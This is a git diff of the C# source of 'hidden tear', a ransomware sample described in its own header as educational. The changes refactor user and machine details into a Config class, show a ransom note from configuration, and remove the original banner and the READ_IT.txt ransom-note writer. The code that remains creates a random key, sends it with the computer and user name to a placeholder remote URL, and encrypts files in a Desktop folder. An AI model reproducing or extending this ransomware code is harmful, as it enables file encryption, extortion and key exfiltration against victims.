@@ -1,29 +1,4 @@
-﻿/*
- _     _     _     _              _                  
-| |   (_)   | |   | |            | |                 
-| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
-| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
-| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
-|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
- 
- * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
- * Remake by 0xbdg(?0) / March 2024 /https://github.com/0xbdg  
- * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
- * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
- * 
- * Ve durdu saatler 
- * Susuyor seni zaman
- * Sesin dondu kulagimda
- * Dedi uykudan uyan
- * 
- * Yine boyle bir aksamdi
- * Sen guluyordun ya gozlerimin icine
- * Feslegenler boy vermisti
- * Gokten parlak bir yildiz dustu pesine
- * Sakladim gozyaslarimi
- */
-
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -40,6 +15,7 @@ using System.Net;
 using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
+using hidden_tear.Tools;
 
 
 namespace hidden_tear
@@ -48,10 +24,6 @@ namespace hidden_tear
     {
         //Url to send encryption password and computer info
         string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
-        string userName = Environment.UserName;
-        string computerName = System.Environment.MachineName.ToString();
-        string userDir = "C:\\Users\\";
-
 
 
         public Form1()
@@ -64,12 +36,12 @@ namespace hidden_tear
             this.ShowInTaskbar = false;
             
             startAction();
-
+            richTextBox1.Text = Config.note;
         }
 
         private void Form_Shown(object sender, EventArgs e)
         {
-            Visible = false;
+            Visible = true;
             Opacity = 100;
         }
 
@@ -118,7 +90,7 @@ namespace hidden_tear
         //Sends created password target location
         public void SendPassword(string password){
             
-            string info = computerName + "-" + userName + " " + password;
+            string info = Config.computerName + "-" + Config.userName + " " + password;
             var fullUrl = targetURL + info;
             var conent = new System.Net.WebClient().DownloadString(fullUrl);
         }
@@ -164,20 +136,11 @@ namespace hidden_tear
         {
             string password = CreatePassword(15);
             string path = "\\Desktop\\test";
-            string startPath = userDir + userName + path;
+            string startPath = Config.userDir + Config.userName + path;
             SendPassword(password);
             encryptDirectory(startPath,password);
-            messageCreator();
             password = null;
             System.Windows.Forms.Application.Exit();
-        }
-
-        public void messageCreator()
-        {
-            string path = "\\Desktop\\test\\READ_IT.txt";
-            string fullpath = userDir + userName + path;
-            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
-            System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
 }
